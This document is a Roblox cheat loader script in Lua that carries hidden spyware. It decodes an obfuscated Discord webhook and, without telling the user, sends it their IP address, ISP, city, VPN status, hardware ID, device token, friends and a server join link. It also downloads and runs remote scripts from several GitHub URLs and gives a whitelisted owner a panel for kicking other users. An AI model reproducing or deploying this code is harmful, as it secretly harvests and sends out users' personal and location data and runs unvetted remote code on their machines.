local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _stg = _ts:FindFirstChild("__NK_RUNTIME")
local _auth = _stg and _stg:FindFirstChild(_lp.Name)

if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
    _lp:Kick("Execution prohibited. Use official loader.")
    return
end
shared._NK_AUTH = nil

local function _H(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

local _req = (syn and syn.request or request or http_request)
local _HS = game:GetService("HttpService")
local _MS = game:GetService("MarketplaceService")
local _RS = game:GetService("ReplicatedStorage")
local _US = game:GetService("UserInputService")
local _uid = tostring(_lp.UserId)
local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
local _tk = "N/A"
pcall(function()
    if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
    else _tk = _HS:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
end)

local _W = _H("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")

local function _LOG()
    pcall(function()
        local r = _req({Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting", Method = "GET"})
        local ni = r and r.Success and _HS:JSONDecode(r.Body) or {}
        
        local u = 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
        local exe = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
        
        local fn, ft = "None", "None"
        local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
        if fdf then
            for _, f in ipairs(fdf:GetChildren()) do
                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
                    local bd = f:FindFirstChild("BasicFactionData")
                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
                    break
                end
            end
        end

        local jid = game.JobId == "" and "Unknown" or game.JobId
        local jLink = "https://tinyurl.com/api-create.php?url=" .. _HS:UrlEncode("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jid)
        local jFinal = "N/A" pcall(function() local jr = _req({Url = jLink, Method = "GET"}) if jr.Success then jFinal = jr.Body end end)
        
        local friends = {}
        for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end

        local payload = {
            ["embeds"] = {{
                ["title"] = "Execution Log",
                ["color"] = 65280,
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: %s (@%s)\nUser ID: `%s`", _lp.DisplayName, _lp.Name, _uid), ["inline"] = false},
                    {["name"] = "Executor", ["value"] = exe, ["inline"] = true},
                    {["name"] = "System", ["value"] = "Platform: " .. (_US.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("IP: %s\nISP: %s\nLoc: %s, %s\nVPN: %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", (ni.proxy and "Yes" or "No")), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("Game: %s\nID: `%s`", _MS:GetProductInfo(game.PlaceId).Name, game.PlaceId), ["inline"] = false},
                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jFinal, _uid), ["inline"] = false}
                }
            }}
        }
        _req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _HS:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)

-- DRAGGABLE PANEL
if _lp.UserId == 10760143653 then -- Твой ID для вайтлиста
    task.spawn(function()
        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
        Instance.new("UICorner", f)
        local s = Instance.new("ScrollingFrame", f)
        s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
        Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
        local function refresh()
            for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
            for _, pObj in ipairs(_stg:GetChildren()) do
                local b = Instance.new("TextButton", s)
                b.Size = UDim2.new(1, 0, 0, 30); b.Text = pObj.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
                b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
            end
        end
        _US.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
    end)
end

_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)

pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))() end)
pcall(function() if _RS:FindFirstChild("ACS_Engine") then _RS.ACS_Engine.Events.FDMG:Destroy() end end)
